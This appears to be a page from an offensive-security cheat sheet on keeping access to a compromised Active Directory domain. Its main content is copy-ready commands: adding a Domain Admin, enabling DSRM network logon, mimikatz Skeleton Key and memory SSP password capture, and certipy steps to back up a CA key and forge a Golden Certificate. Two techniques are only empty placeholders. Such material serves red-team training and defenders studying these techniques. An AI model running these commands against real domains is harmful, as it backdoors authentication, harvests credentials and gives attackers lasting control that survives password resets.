# Directory Persistence

Beyond ticket forging, several techniques embed persistence into the directory or the DCs themselves: DCShadow rewrites the directory as a rogue DC, DSRM and Skeleton Key backdoor authentication, a Golden Certificate persists through ADCS, and ACL edits leave quiet grants behind.

## Why It Works

A domain controller trusts other domain controllers and its own authentication packages. Techniques here abuse that trust to plant changes that outlive credential resets, because they modify the directory or the DC rather than relying on a stolen secret.

## Prerequisites

* Domain admin or equivalent control of a DC
* For Golden Certificate: access to the CA private key

## Execution

**ADD DA**

* `net group "domain admins" myuser /add /domain`

**DC shadow**

* _(leaf node in the source diagram)_

**Directory Service Restore Mode (DSRM)**

* `PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`

**Skeleton Key**

* `mimikatz "privilege::debug" "misc::skeleton" "exit" #password is mimikatz` [\[tool\]](https://github.com/gentilkiwi/mimikatz)

**Custom SSP**

* `mimikatz "privilege::debug" "misc::memssp" "exit"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
  * `C:\Windows\System32\kiwissp.log`

**Golden certificate**

* `certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>` [\[tool\]](https://github.com/ly4k/Certipy)
  * `certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>` [\[tool\]](https://github.com/ly4k/Certipy)

**ACL manipulation**

* _(leaf node in the source diagram)_

{% hint style="warning" %}
Skeleton Key and custom SSPs modify LSASS on the DC and are both detectable and destabilising. Treat them as loud, last-resort techniques.
{% endhint %}

## Related

* [Golden, Silver, Diamond & Sapphire Tickets](file:///9685693/domain-dominance/golden-and-silver-tickets.md) — the ticket-based persistence
* [DCSync Rights](file:///9685693/acl-abuse/dcsync-rights.md) — the ACL grants used for quiet persistence
